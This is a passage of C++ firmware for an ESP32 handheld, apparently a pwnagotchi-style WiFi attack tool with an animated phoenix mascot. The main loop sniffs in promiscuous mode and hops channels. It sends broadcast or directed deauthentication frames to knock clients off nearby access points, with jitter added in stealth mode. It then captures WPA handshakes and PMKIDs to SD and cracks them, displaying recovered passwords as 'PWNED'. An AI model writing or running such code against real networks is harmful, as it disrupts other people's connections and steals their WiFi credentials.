      case 0: g.fillRect(hx - P(3), hy - P(1), P(6), P(2), PH_EYE); break;                                       // calm flat
      case 1: g.fillCircle(hx + P(1), hy, P(2), PH_EYE); g.drawLine(hx - P(4), hy - P(4), hx + P(1), hy - P(2), PH_EYE); break; // alert+brow
      case 2: g.drawLine(hx - P(4), hy - P(3), hx + P(1), hy, PH_EYE); g.drawLine(hx - P(4), hy + P(3), hx + P(1), hy, PH_EYE); break; // > squint
      case 3: g.drawLine(hx - P(3), hy + P(1), hx, hy - P(2), PH_EYE); g.drawLine(hx, hy - P(2), hx + P(3), hy + P(1), PH_EYE); break; // ^ happy
      case 4: g.drawLine(hx - P(3), hy - P(1), hx - P(1), hy + P(1), PH_EYE); g.drawLine(hx - P(1), hy + P(1), hx + P(2), hy - P(1), PH_EYE); break; // u sad
    }
    // tail flames
    if (flame > 0) {
        g.fillTriangle(cx, cy + P(20), cx - P(4) - flick, cy + P(20 + 6 * flame), cx + P(4) + flick, cy + P(20 + 6 * flame), t1);
        if (flame >= 2) {
            g.fillTriangle(cx - P(7), cy + P(16), cx - P(12) - flick, cy + P(14 + 5 * flame), cx - P(3), cy + P(16 + 4 * flame), t2);
            g.fillTriangle(cx + P(7), cy + P(16), cx + P(12) + flick, cy + P(14 + 5 * flame), cx + P(3), cy + P(16 + 4 * flame), t2);
        }
    } else {   // lonely: a tiny dying ember
        g.fillTriangle(cx, cy + P(20), cx - P(2), cy + P(27), cx + P(2), cy + P(27), PH_ORANGE);
    }
    // rising embers for crack / pwned
    if (m == PM_CRACK || m == PM_PWNED) {
        int span = P(26); if (span < 1) span = 1;
        int ey = cy + P(10) - (int)((fr * 3) % (unsigned)span);
        g.fillCircle(cx - P(8), ey, P(2), PH_GOLD); g.fillCircle(cx + P(8), ey + P(7), P(2), PH_GOLD);
        if (m == PM_PWNED) { g.fillCircle(cx - P(18), cy - P(18), P(2), PH_GOLD); g.fillCircle(cx + P(18), cy - P(16), P(2), PH_GOLD);
                             g.fillCircle(cx, cy - P(30), P(2), PH_CORE); }
    }
}

// ── main entry ────────────────────────────────────────────────────────────────
static bool argHas(const char* a, const char* w) { return a && strstr(a, w); }

static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
    DisplayManager& dm = displayManager;
    s_nTarg = 0; s_nCli = 0; memset(&s_cap, 0, sizeof(s_cap)); s_priorityDone.clear(); s_sessionCaps.clear();
    s_rHead = s_rTail = 0;
    whitelistLoad();   // cache whitelist once (hot path checks RAM, not SD)

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(false);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&pwnRxCb);
    esp_wifi_set_promiscuous(true);
    s_sniffing = true;

    int nChans = fullChans ? 13 : (int)(sizeof(PWN_CHANS));
    int ci = 0;
    uint8_t curCh = fullChans ? 1 : PWN_CHANS[0];
    uint32_t apCount = 0, hsCount = 0, pmCount = 0, pwnedCount = 0;
    char ticker[40] = "roaming...";
    char mood[10] = "IDLE";
    uint32_t hopAt = 0, drawAt = 0, pwnFlash = 0, toastUntil = 0, frame = 0, crackAt = 0, lastMoodEvt = 0, lastM1Ms = 0;
    bool running = true;
    char toast[28] = {0};
    uint32_t t0Session = millis();

    // layout + double-buffered phoenix box
    const int BOX_X = 6, BOX_W = 216, BOX_H = 158, BOX_Y = outputY + 18;   // big ember chamber
    const int RX = BOX_X + BOX_W + 4;               // right stats column x (=226)
    const int BY = BOX_Y + BOX_H + 4;               // below-box strip y
    LGFX_Sprite phx(&tft);
    phx.setColorDepth(16);
    phx.setPsram(true);                             // PSRAM sprite (keep DRAM free for WiFi)
    bool haveSpr = phx.createSprite(BOX_W, BOX_H);

    // static chrome: header + maroon rule (dynamic values drawn per-frame with a bg
    // colour so they overwrite in place — no full-screen flicker)
    auto drawChrome = [&]() {
        dm.clearScreen(); dm.setDefaultTextSize();
        dm.setCursor(4, outputY);
        dm.setTextColor(PH_DIM);   dm.printText("[");
        dm.setTextColor(TFT_CYAN); dm.printText("PWN");
        dm.setTextColor(PH_DIM);   dm.printText("::");
        dm.setTextColor(PH_AMBER); dm.printText(modeName(mode));
        dm.setTextColor(PH_DIM);   dm.println("]");
        tft.fillRect(4, BOX_Y - 4, SCREEN_WIDTH - 8, 2, PH_MAROON);
    };
    drawChrome();

    while (running) {
        uint32_t now = millis();

        // channel dwell / hop
        if (now >= hopAt) {
            curCh = fullChans ? (uint8_t)(ci + 1) : PWN_CHANS[ci];
            esp_wifi_set_channel(curCh, WIFI_SECOND_CHAN_NONE);
            // attack this channel's known targets (skip in passive; don't hop mid-capture)
            if (mode != PWN_PASSIVE && !(s_cap.active && s_cap.haveM1 && !s_cap.haveM2)) {
                for (int i = 0; i < s_nTarg; i++) {
                    if (s_targ[i].ch != curCh || s_targ[i].captured || s_targ[i].wl) continue;
                    if (s_targ[i].rssi != 0 && s_targ[i].rssi < PWN_RSSI_CUTOFF) continue;
                    if (mode == PWN_STEALTH) {
                        // stealth: ONE directed deauth to a discovered client — no broadcast
                        // storm. If we haven't seen a client for this AP yet, stay quiet.
                        const uint8_t* c = cliFor(s_targ[i].bssid);
                        if (c) { sendDeauth(s_targ[i].bssid, c); break; }
                    } else {
                        sendDeauth(s_targ[i].bssid, nullptr);   // active: broadcast
                    }
                }
            }
            ci = (ci + 1) % nChans;
            uint32_t dwell = PWN_RECON_MS + (mode == PWN_STEALTH ? (esp_random() % 1500) : 0); // jitter
            hopAt = now + dwell;
        }

        // drain sniffed frames
        char ev = drainOne(curCh);
        if (ev == 'B') { apCount = s_nTarg; }
        else if (ev == '1') { strcpy(mood, "HUNT"); lastMoodEvt = now; lastM1Ms = now; }
        else if (ev == '2') { strcpy(mood, "EXCITED"); lastMoodEvt = now; }

        // complete a capture?
        if (s_cap.active && s_cap.haveM1 && (s_cap.haveM2 || s_cap.m1HasPmkid)) {
            bool wasHs = s_cap.haveM2;
            PwnTarget* tt = targFind(s_cap.bssid);
            flushCapture(tt ? tt->rssi : 0, tt ? tt->ch : curCh);
            if (wasHs) { hsCount++; snprintf(ticker, sizeof(ticker), "+HS %.24s", s_lastSaveFile + sizeof(SD_DIR_PWN)); }
            else       { pmCount++; snprintf(ticker, sizeof(ticker), "+PMKID captured"); }
            strcpy(mood, "EXCITED"); lastMoodEvt = now;
        }

        // Abandon a stale incomplete capture (an M1 that never got its M2/PMKID). Without
        // this s_cap.active stays set forever and blocks BOTH new captures and idle
        // cracking — the "found APs but stuck on IDLE, never cracks" bug.
        if (s_cap.active && (now - s_cap.startMs) > 3000) s_cap.active = false;

        // idle → crack a cap for one slice (rotate past solved/exhausted caps).
        // "Idle" = no handshake capture in progress AND not right after a deauth (so a
        // triggered handshake still lands). Ambient beacons do NOT block cracking — that
        // was the bug that kept it stuck on IDLE. Throttled so an exhausted backlog can't
        // re-scan SD every loop.
        // crack unless a handshake is genuinely in flight: only pause briefly (1.2s) after
        // an actual M1 so its M2 can land. Deauth alone does NOT block cracking (a deauth
        // with no reconnecting client produces no handshake), so a busy active-mode channel
        // can't starve the cracker.
        bool canCrack = (now - lastM1Ms) > 1200;
        if (canCrack && now >= crackAt) {
            crackAt = now + 700;
            std::vector<String> caps;
            if (backlog) {                                 // all caps on disk
                File d = SD.open(SD_DIR_PWN);
                if (d && d.isDirectory()) {
                    for (File f = d.openNextFile(); f; f = d.openNextFile()) {
                        if (!f.isDirectory()) {
                            String nm = f.name(); String low = nm; low.toLowerCase();
                            if (low.endsWith(".cap")) {
                                int sl = nm.lastIndexOf('/');
                                caps.push_back(SD_DIR_PWN "/" + (sl >= 0 ? nm.substring(sl + 1) : nm));
                            }
                        }
                        f.close();
                    }
                }
                if (d) d.close();
            } else {
                caps = s_sessionCaps;                      // [k] session-only: just this run's caps
            }
            for (auto& cp : caps) {                         // first cap that actually has work wins
                char found[64] = {0}, ss[33] = {0}, prog[16] = {0};
                int r = pwnCrackCap(cp.c_str(), found, sizeof(found), ss, prog);
                if (r == -1) continue;                      // solved/exhausted/unparseable → next
                if (r == 1) { pwnedCount++; strcpy(mood, "PWNED"); pwnFlash = now + 2500;
                    snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", ss, found); }
                else { strcpy(mood, "CRACK");
                    snprintf(ticker, sizeof(ticker), "crack %.14s  %s", ss[0] ? ss : cp.c_str() + sizeof(SD_DIR_PWN), prog); }
                lastMoodEvt = now;
                break;
            }
        }

        // mood decay: after a quiet stretch (no capture/crack event) settle back to
        // IDLE, or LONELY when no APs are in range at all.
        if ((now - lastMoodEvt) > 2500 && !s_cap.active)
            strcpy(mood, s_nTarg ? "IDLE" : "LONELY");

        // redraw ~8fps (phoenix animates)
        if (LockScreenManager::getInstance().consumeJustUnlocked()) { drawChrome(); drawAt = 0; }
        if (now - drawAt >= 120 && !displayManager.isBlocked()) {
            drawAt = now; frame++;
            int mid = moodId(mood);
            bool celebrate = (now < pwnFlash) && ((now / 200) & 1);
            char l[52];

            // strongest live signal (uncaptured targets)
            int8_t best = 0;
            for (int i = 0; i < s_nTarg; i++)
                if (!s_targ[i].captured && !s_targ[i].wl && s_targ[i].rssi != 0 && (best == 0 || s_targ[i].rssi > best))
                    best = s_targ[i].rssi;
            int bars = best == 0 ? 0 : best >= -55 ? 4 : best >= -67 ? 3 : best >= -77 ? 2 : best >= -86 ? 1 : 0;

            // ── big phoenix ember chamber (double-buffered) ──
            if (haveSpr) {
                phx.fillSprite(celebrate ? PH_ORANGE : PH_BOXBG);
                drawPhoenix(phx, BOX_W / 2, 74, mid, frame, 1.6f);
                phx.drawRoundRect(0, 0, BOX_W, BOX_H, 6, PH_BOXBRD);
                phx.drawRoundRect(1, 1, BOX_W - 2, BOX_H - 2, 6, PH_BOXBRD);
                phx.pushSprite(BOX_X, BOX_Y);
            }

            // ── right stats column (bg colour → in-place overwrite, no flicker) ──
            uint16_t mc = mid == PM_PWNED ? PH_GOLD : mid == PM_HUNT ? PH_AMBER : mid == PM_CRACK ? PH_ORANGE : TFT_CYAN;
            tft.fillRect(RX, BOX_Y, SCREEN_WIDTH - RX, 20, TFT_BLACK);
            tft.setTextSize(2); tft.setTextColor(mc, TFT_BLACK); tft.setCursor(RX, BOX_Y); tft.print(mood);
            tft.setTextSize(1);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 24);
            snprintf(l, sizeof(l), "%-7s ch%-2u", modeName(mode), curCh); tft.print(l);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 40); tft.print("SIGNAL");
            for (int i = 0; i < 4; i++) tft.fillRect(RX + i * 14, BOX_Y + 52, 11, 13, i < bars ? TFT_GREEN : PH_ASHDK);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 72);
            snprintf(l, sizeof(l), "UP %lum   ", (unsigned long)((now - t0Session) / 60000)); tft.print(l);
            tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.setCursor(RX, BOX_Y + 88);
            snprintf(l, sizeof(l), "%u APs    ", (unsigned)apCount); tft.print(l);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 106);
            snprintf(l, sizeof(l), "HS %-4u", (unsigned)hsCount); tft.print(l);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 120);
            snprintf(l, sizeof(l), "PMKID %-4u", (unsigned)pmCount); tft.print(l);
            // PWNED chip
            tft.drawRect(RX, BOX_Y + 134, SCREEN_WIDTH - RX - 4, 16, PH_MAROON);
            tft.setTextColor(PH_MAROON, TFT_BLACK); tft.setCursor(RX + 3, BOX_Y + 138); tft.print("PWNED");
            tft.setTextColor(PH_GOLD, TFT_BLACK); tft.setCursor(RX + 62, BOX_Y + 138);
            snprintf(l, sizeof(l), "%-3u", (unsigned)pwnedCount); tft.print(l);

            // ── below-box strip: ticker (or toast) + footer ──
            if (now < toastUntil) { tft.setTextColor(TFT_YELLOW, TFT_BLACK); snprintf(l, sizeof(l), "%-42.42s", toast); }
            else { tft.setTextColor(PH_AMBER, TFT_BLACK); snprintf(l, sizeof(l), "> %-40.40s", ticker); }
            tft.setCursor(6, BY); tft.print(l);
            tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(6, BY + 14);
            snprintf(l, sizeof(l), "[m]mode [c]%s [k]%s [q]quit ", fullChans ? "all" : "1/6/11", backlog ? "all" : "sess");
            tft.print(l);
        }

        // input
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') running = false;
        else if (k == 'm' || k == 'M') { mode = (PwnMode)((mode + 1) % 3); drawChrome(); drawAt = 0; }
        else if (k == 'c' || k == 'C') { fullChans = !fullChans; nChans = fullChans ? 13 : (int)sizeof(PWN_CHANS); ci = 0;
                                         snprintf(toast, sizeof(toast), "channels: %s", fullChans ? "1-13" : "1/6/11");
                                         toastUntil = now + 1500; drawAt = 0; }
        else if (k == 'k' || k == 'K') { backlog = !backlog;
                                         snprintf(toast, sizeof(toast), "crack: %s", backlog ? "all backlog" : "session only");
                                         toastUntil = now + 1500; drawAt = 0; }
        else if (k == 's' || k == 'S') { snprintf(toast, sizeof(toast), "AP%u HS%u PM%u PWN%u", (unsigned)apCount,
                                         (unsigned)hsCount, (unsigned)pmCount, (unsigned)pwnedCount);
                                         toastUntil = now + 2000; drawAt = 0; }

        vTaskDelay(pdMS_TO_TICKS(5));
    }

    // teardown (GDMA-safe): stop TX/promiscuous, leave WiFi STA-idle
    s_sniffing = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_STA);
    if (haveSpr) phx.deleteSprite();
    dm.clearScreen();
    dm.printCommandScreen();
}

// ── whitelist subcommands ─────────────────────────────────────────────────────
static void wlList(DisplayManager& dm) {
    dm.clearScreen(); dm.setCursor(4, outputY);
    dm.setTextColor(TFT_CYAN); dm.println("[PWN WHITELIST]"); dm.printSeparator();
    File f = SD.open(PWN_F_WHITELIST, FILE_READ);
    int n = 0;
    if (f) {
        while (f.available()) {
            String ln = f.readStringUntil('\n'); ln.trim();
            if (!ln.length() || ln[0] == '#') continue;
            dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
            char b[46]; snprintf(b, sizeof(b), "[%d] %.38s", n, ln.c_str()); dm.println(b); n++;
        }
        f.close();
    }
    if (!n) { dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF); dm.println("(empty)"); }
    dm.printCommandScreen();
}
static void wlAppend(const char* type, const char* value, const char* label) {
    sdCardManager.ensureDir(SD_DIR_PWN);
    File f = SD.open(PWN_F_WHITELIST, FILE_APPEND);
    if (!f) return;
    f.printf("%s,%s,%s\n", type, value, label ? label : "");
    f.close();
}

void runPwn(char* args) {
    DisplayManager& dm = displayManager;
    if (!sdCardManager.canAccessSD()) {
        dm.setCursor(10, dm.getCursorY()); dm.setTextColor(TFT_RED);
        dm.println("No SD — pwn needs SD for captures."); dm.setTextColor(TFT_WHITE);
        dm.printCommandScreen(); return;
    }
    sdCardManager.ensureDir(SD_DIR_PWN);

    char buf[128]; buf[0] = 0;
    if (args) { strncpy(buf, args, sizeof(buf) - 1); }
    char* tok = strtok(buf, " ");

    // whitelist subcommands: pwn wl [list|add ...|rm <n>|clear]
    if (tok && (!strcmp(tok, "wl") || !strcmp(tok, "whitelist"))) {
        char* sub = strtok(nullptr, " ");
        if (!sub || !strcmp(sub, "list")) { wlList(dm); return; }
        if (!strcmp(sub, "clear")) { SD.remove(PWN_F_WHITELIST); wlList(dm); return; }
        if (!strcmp(sub, "add")) {
            char* a1 = strtok(nullptr, " ");
            if (!a1) { dm.println("usage: pwn wl add <idx|bssid>|ssid <name>"); dm.printCommandScreen(); return; }
            if (!strcmp(a1, "ssid")) {
                char* nm = strtok(nullptr, "");             // rest of line = name
                if (!nm || !*nm) { dm.println("usage: pwn wl add ssid <name>"); dm.printCommandScreen(); return; }
                while (*nm == ' ') nm++;
                wlAppend("ssid", nm, "");
                dm.clearScreen(); dm.setCursor(4, outputY);   // dedicated confirm (wlList would wipe it)
                dm.setTextColor(TFT_GREEN);
                char b[52]; snprintf(b, sizeof(b), "Whitelisted SSID: %.28s", nm); dm.println(b);
                dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_YELLOW);
                dm.println("WARN: skips ALL APs with this name.");
                dm.printCommandScreen(); return;
            }
            uint8_t bssid[6]; char ssid[33] = {0};
            if (macParse(a1, bssid)) { char m[18]; macStr(bssid, m); wlAppend("bssid", m, ""); }
            else {                                          // treat as sw index
                int idx = atoi(a1); int ch;
                if (!wifiFunctions.isScanDone() || !wifiFunctions.getNetworkInfo(idx, bssid, &ch)) {
                    dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_RED);
                    dm.println("Bad index — run sw first."); dm.printCommandScreen(); return;
                }
                wifiFunctions.getNetworkSSID(idx, ssid);
                char m[18]; macStr(bssid, m); wlAppend("bssid", m, ssid);
            }
            wlList(dm); return;
        }
        if (!strcmp(sub, "rm")) {
            char* a1 = strtok(nullptr, " "); int target = a1 ? atoi(a1) : -1;
            // rewrite file without row #target
            File f = SD.open(PWN_F_WHITELIST, FILE_READ);
            std::vector<String> keep; int n = 0;
            if (f) { while (f.available()) { String ln = f.readStringUntil('\n'); ln.trim();
                if (!ln.length() || ln[0] == '#') continue; if (n != target) keep.push_back(ln); n++; } f.close(); }
            File w = SD.open(PWN_F_WHITELIST, FILE_WRITE);
            if (w) { for (auto& s : keep) { w.println(s); } w.close(); }
            wlList(dm); return;
        }
        wlList(dm); return;
    }

    // mode / channel flags
    PwnMode mode = PWN_ACTIVE;
    if (argHas(args, "passive")) mode = PWN_PASSIVE;
    else if (argHas(args, "stealth")) mode = PWN_STEALTH;
    bool full = argHas(args, "full");

    runPwnSession(mode, full, /*backlog*/ true);
}
